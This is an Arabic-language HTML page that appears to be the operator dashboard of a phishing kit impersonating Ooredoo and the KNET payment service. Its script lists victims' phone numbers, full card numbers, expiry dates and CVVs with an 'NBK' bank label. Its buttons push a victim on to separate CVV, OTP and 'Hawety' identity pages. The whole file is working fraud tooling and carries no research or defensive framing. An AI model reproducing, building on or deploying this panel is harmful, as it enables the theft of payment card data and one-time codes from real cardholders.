<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - Ooredoo</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            overflow: hidden;
        }

        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 600;
        }

        .header-buttons {
            display: flex;
            gap: 10px;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .btn-primary {
            background: #4CAF50;
            color: white;
        }

        .btn-primary:hover {
            background: #45a049;
        }

        .btn-danger {
            background: #f44336;
            color: white;
        }

        .btn-danger:hover {
            background: #da190b;
        }

        .btn-secondary {
            background: #2196F3;
            color: white;
        }

        .btn-secondary:hover {
            background: #0b7dda;
        }

        .content {
            padding: 30px;
        }

        .tabs {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
            border-bottom: 2px solid #e0e0e0;
        }

        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border: none;
            background: none;
            font-size: 16px;
            font-weight: 600;
            color: #666;
            border-bottom: 3px solid transparent;
            transition: all 0.3s ease;
        }

        .tab.active {
            color: #667eea;
            border-bottom-color: #667eea;
        }

        .table-wrapper {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th {
            background: #f5f5f5;
            padding: 15px;
            text-align: right;
            font-weight: 600;
            color: #333;
            border-bottom: 2px solid #e0e0e0;
        }

        td {
            padding: 15px;
            border-bottom: 1px solid #e0e0e0;
            color: #666;
        }

        tr:hover {
            background: #f9f9f9;
        }

        .status-badge {
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-success {
            background: #d4edda;
            color: #155724;
        }

        .status-warning {
            background: #fff3cd;
            color: #856404;
        }

        .status-danger {
            background: #f8d7da;
            color: #721c24;
        }

        .action-buttons {
            display: flex;
            gap: 10px;
        }

        .action-btn {
            padding: 5px 10px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .action-btn-info {
            background: #e3f2fd;
            color: #1976d2;
        }

        .action-btn-info:hover {
            background: #bbdefb;
        }

        /* Modal Styles */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
        }

        .modal.show {
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            max-width: 500px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #e0e0e0;
            padding-bottom: 15px;
        }

        .modal-header h2 {
            font-size: 20px;
            color: #333;
        }

        .close-btn {
            background: none;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #666;
        }

        .close-btn:hover {
            color: #333;
        }

        .modal-body {
            margin-bottom: 20px;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
            padding: 10px 0;
            border-bottom: 1px solid #f0f0f0;
        }

        .info-label {
            font-weight: 600;
            color: #333;
        }

        .info-value {
            color: #666;
        }

        .modal-footer {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .modal-btn {
            padding: 8px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .modal-btn-primary {
            background: #4CAF50;
            color: white;
        }

        .modal-btn-primary:hover {
            background: #45a049;
        }

        .modal-btn-secondary {
            background: #2196F3;
            color: white;
        }

        .modal-btn-secondary:hover {
            background: #0b7dda;
        }

        .modal-btn-danger {
            background: #f44336;
            color: white;
        }

        .modal-btn-danger:hover {
            background: #da190b;
        }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: #999;
        }

        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>لوحة التحكم - Ooredoo</h1>
            <div class="header-buttons">
                <button class="btn btn-secondary" onclick="goHome()">الرئيسية</button>
                <button class="btn btn-danger" onclick="logout()">تسجيل الخروج</button>
            </div>
        </div>

        <div class="content">
            <div class="tabs">
                <button class="tab active" onclick="switchTab('transactions')">التسجيلات</button>
                <button class="tab" onclick="switchTab('accounts')">الحسابات</button>
                <button class="tab" onclick="switchTab('reports')">التقارير</button>
            </div>

            <div id="transactions" class="tab-content">
                <div class="table-wrapper">
                    <table id="transactionsTable">
                        <thead>
                            <tr>
                                <th>الوقت</th>
                                <th>رقم الهاتف</th>
                                <th>المبلغ</th>
                                <th>حالة البطاقة</th>
                                <th>الإجراءات</th>
                            </tr>
                        </thead>
                        <tbody id="tableBody">
                            <!-- Data will be populated here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <div id="accounts" class="tab-content" style="display: none;">
                <div class="empty-state">
                    <div class="empty-state-icon">📊</div>
                    <p>لا توجد حسابات لعرضها</p>
                </div>
            </div>

            <div id="reports" class="tab-content" style="display: none;">
                <div class="empty-state">
                    <div class="empty-state-icon">📈</div>
                    <p>لا توجد تقارير لعرضها</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Card Details Modal -->
    <div id="cardModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>معلومات البطاقة</h2>
                <button class="close-btn" onclick="closeModal('cardModal')">&times;</button>
            </div>
            <div class="modal-body" id="cardDetails">
                <!-- Card details will be populated here -->
            </div>
            <div class="modal-footer">
                <button class="modal-btn modal-btn-primary" onclick="acceptTransaction()">قبول</button>
                <button class="modal-btn modal-btn-danger" onclick="rejectTransaction()">رفض</button>
                <button class="modal-btn modal-btn-secondary" onclick="goToCVV()">نقل إلى CVV</button>
                <button class="modal-btn modal-btn-secondary" onclick="goToOTP()">نقل إلى OTP</button>
                <button class="modal-btn modal-btn-secondary" onclick="goToHawety()">نقل إلى الهويتي</button>
            </div>
        </div>
    </div>

    <script>
        let currentTransaction = null;

        // Load transactions from localStorage
        function loadTransactions() {
            const tableBody = document.getElementById('tableBody');
            tableBody.innerHTML = '';

            // Get all transactions from localStorage
            const transactions = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.startsWith('transaction_')) {
                    const data = JSON.parse(localStorage.getItem(key));
                    transactions.push(data);
                }
            }

            // Sort by timestamp (newest first)
            transactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

            if (transactions.length === 0) {
                tableBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #999;">لا توجد معاملات</td></tr>';
                return;
            }

            transactions.forEach((transaction, index) => {
                const row = document.createElement('tr');
                const cardStatus = transaction.cardNumber ? 'معلومات البطاقة' : 'لا يوجد بطاقة';
                const statusClass = transaction.cardNumber ? 'status-success' : 'status-warning';

                row.innerHTML = `
                    <td>${new Date(transaction.timestamp).toLocaleString('ar-KW')}</td>
                    <td>${transaction.phoneNumber || 'N/A'}</td>
                    <td>KD ${transaction.amount || '5.000'}</td>
                    <td><span class="status-badge ${statusClass}">${cardStatus}</span></td>
                    <td>
                        <div class="action-buttons">
                            <button class="action-btn action-btn-info" onclick="showCardDetails(${index})">التفاصيل</button>
                        </div>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        }

        // Show card details in modal
        function showCardDetails(index) {
            const transactions = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.startsWith('transaction_')) {
                    const data = JSON.parse(localStorage.getItem(key));
                    transactions.push(data);
                }
            }

            transactions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            currentTransaction = transactions[index];

            const cardDetails = document.getElementById('cardDetails');
            cardDetails.innerHTML = `
                <div class="info-row">
                    <span class="info-label">اسم البنك:</span>
                    <span class="info-value">National Bank of Kuwait [NBK]</span>
                </div>
                <div class="info-row">
                    <span class="info-label">رقم البطاقة:</span>
                    <span class="info-value">${currentTransaction.cardNumber || 'N/A'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">تاريخ الانتهاء:</span>
                    <span class="info-value">${currentTransaction.expiryDate || 'N/A'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">CVV:</span>
                    <span class="info-value">${currentTransaction.cvv || 'N/A'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">رقم الهاتف:</span>
                    <span class="info-value">${currentTransaction.phoneNumber || 'N/A'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">المبلغ:</span>
                    <span class="info-value">KD ${currentTransaction.amount || '5.000'}</span>
                </div>
                <div class="info-row">
                    <span class="info-label">الوقت:</span>
                    <span class="info-value">${new Date(currentTransaction.timestamp).toLocaleString('ar-KW')}</span>
                </div>
            `;

            document.getElementById('cardModal').classList.add('show');
        }

        // Close modal
        function closeModal(modalId) {
            document.getElementById(modalId).classList.remove('show');
        }

        // Accept transaction
        function acceptTransaction() {
            alert('تم قبول المعاملة بنجاح');
            closeModal('cardModal');
            loadTransactions();
        }

        // Reject transaction
        function rejectTransaction() {
            alert('تم رفض المعاملة');
            closeModal('cardModal');
            loadTransactions();
        }

        // Navigate to CVV page
        function goToCVV() {
            window.location.href = '/cvv.html';
        }

        // Navigate to OTP page
        function goToOTP() {
            window.location.href = '/knet/ver.html';
        }

        // Navigate to Hawety page
        function goToHawety() {
            window.location.href = '/hawety.html';
        }

        // Go home
        function goHome() {
            window.location.href = '/';
        }

        // Logout
        function logout() {
            localStorage.clear();
            window.location.href = '/';
        }

        // Switch tabs
        function switchTab(tabName) {
            const tabs = document.querySelectorAll('.tab');
            const contents = document.querySelectorAll('.tab-content');

            tabs.forEach(tab => tab.classList.remove('active'));
            contents.forEach(content => content.style.display = 'none');

            event.target.classList.add('active');
            document.getElementById(tabName).style.display = 'block';
        }

        // Close modal when clicking outside
        window.onclick = function(event) {
            const modal = document.getElementById('cardModal');
            if (event.target == modal) {
                modal.classList.remove('show');
            }
        }

        // Load transactions on page load
        window.addEventListener('load', loadTransactions);
    </script>
</body>
</html>
